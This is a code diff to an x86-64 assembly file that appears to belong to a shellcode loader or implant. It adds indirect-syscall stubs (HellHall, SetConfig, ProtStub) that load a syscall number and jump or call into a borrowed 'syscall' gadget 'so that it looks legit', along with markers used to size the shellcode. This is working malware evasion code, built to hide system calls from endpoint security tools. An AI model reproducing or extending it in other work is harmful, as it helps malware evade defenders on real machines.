@@ -3,12 +3,15 @@ extern Entry
 
 global Start
 global GetRIP
+global GetRIPE
 global GetRIPEnd
 global HellHall
 global SetConfig
 global KaynCaller
+global ProtStub
 
 section .text$A
+    ; stack alignment + allocating stack space, then calling entrypoint apparently
     Start:
         push    rsi
         mov	rsi, rsp
@@ -48,7 +51,7 @@ section .text$B
         mov rax, rcx
     ret
 
-section .text$F
+section .text$C
     GetRIP:
         call    retptr
 
@@ -59,16 +62,62 @@ section .text$F
 
 section .text$C
     SetConfig:
-    	mov r10d, ecx
-        mov r11, rdx			
+    	mov r10d, ecx           ; store the SSN in the r10d
+        mov r11, rdx	        ; store the syscall gadget in r11
         ret
 
 section .text$C
     HellHall:
-        mov eax, r10d		
-        mov r10, rcx	
-        jmp r11		; JUMPING TO A ADDRESS WHERE WE HAVE `syscall` INSTRUCTION - SO THAT IT LOOKS LEGIT
+        mov eax, r10d		           ; paste the SSN into the eax
+        mov r10, rcx	               
+        jmp r11		                   ; jumping to the syscall gadget
         ret
+    ret
+
+section .text$D
+    ;
+    ; typedef struct
+    ; {
+    ;    SIZE_T StackArgs;    // Indicates to the callback how many of the args to iterate through
+    ;    PVOID Args[16];     // up to 16 in size
+    ; } ProtStubArgs, *PProtStubArgs;
+    ; ProtStub( &ProtStubArgs )
+    ; The registers themselves are addresses, but putting brackets is basically getting their value it
+    ProtStub:
+        ; Let's store the StackCount in r12, and the base of our args in r13
+        mov r12, [rcx]           ; Store the StackArgCount in the r12    
+        mov r13, rcx             ; Store the address of the struct into r13
+        add r13, 8               ; Increment by 8 so now r13 is the base of the array
+        ; Lets move the first four args in now
+        ; Doesn't matter if the values in the array are 0, cause unused registers being 0 doesn't do anything to the syscall
+        mov rcx, [r13]
+        mov rdx, [r13 + 0x8]
+        mov r8, [r13 + 0x10]
+        mov r9, [r13 + 0x18]
+        ; Now iterate through the StackArgCount and shove shit on the stack. Thanks GPT
+        arg_loop:
+            cmp r12, 0           ; Compare r12 with zero
+            jle loop_end         ; If r12 <= 0, jump to loop_end
+            dec r12              ; decrement
+            mov rax, qword [r13 + 0x20 + 0x8 * r12] ; push [r13 + 0x28 + 0x8 * r12]. Thanks Mung for sanity checkin my shitty math
+            push rax
+        jmp arg_loop ; Jump back to loop_start
+        loop_end:
+
+        sub rsp, 020h
+
+        mov eax, r10d		         ; paste the SSN into the eax
+        mov r10, rcx	             ; normal syscall shit
+        call r11		             ; jumping to the syscall gadget. return back to us so i can do some janky "fixes" HAHAHAHA
+
+        add rsp, 028h
+        ret
+    ret
+
+; Random function at E to determine length of ProtStub 
+section .text$E
+    GetRIPE:
+        call    retptr
     ret
 
 ; Random function at the end (5 bytes long) to determine the end of the shellcode
